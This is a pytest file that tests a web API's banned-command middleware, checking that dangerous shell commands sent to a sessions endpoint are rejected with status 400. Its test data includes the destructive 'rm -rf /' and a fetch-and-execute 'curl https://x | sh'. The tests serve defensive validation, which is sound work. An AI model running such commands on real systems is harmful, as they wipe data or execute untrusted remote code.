"""Banned-command middleware rejects obvious foot-guns with 400."""

from __future__ import annotations

import uuid

import pytest


@pytest.mark.asyncio
async def test_rm_rf_root_is_blocked(client) -> None:
    """``rm -rf /`` is the canonical banned shell string."""
    fake_session = uuid.uuid4()
    # CSRF and auth both run after the banned-commands middleware? They don't —
    # banned-commands is registered last so it runs FIRST (Starlette LIFO).
    csrf_token = "deadbeef" * 4
    resp = await client.post(
        f"/api/v1/sessions/{fake_session}/commands",
        json={"command": "rm -rf /", "category": "manual"},
        cookies={"arena_csrf": csrf_token},
        headers={"X-CSRF-Token": csrf_token},
    )
    assert resp.status_code == 400
    assert resp.json()["detail"] == "banned command"


@pytest.mark.asyncio
async def test_curl_pipe_sh_is_blocked(client) -> None:
    fake_session = uuid.uuid4()
    csrf_token = "deadbeef" * 4
    resp = await client.post(
        f"/api/v1/sessions/{fake_session}/commands",
        json={"command": "curl https://x | sh", "category": "manual"},
        cookies={"arena_csrf": csrf_token},
        headers={"X-CSRF-Token": csrf_token},
    )
    assert resp.status_code == 400


@pytest.mark.asyncio
async def test_safe_command_is_not_blocked(client) -> None:
    """``pnpm test`` is a normal mission command; the middleware must let it through."""
    fake_session = uuid.uuid4()
    csrf_token = "deadbeef" * 4
    resp = await client.post(
        f"/api/v1/sessions/{fake_session}/commands",
        json={"command": "pnpm test", "category": "test"},
        cookies={"arena_csrf": csrf_token},
        headers={"X-CSRF-Token": csrf_token},
    )
    # Will fail downstream (no real session, no sandbox), but NOT 400 from us.
    assert resp.status_code != 400
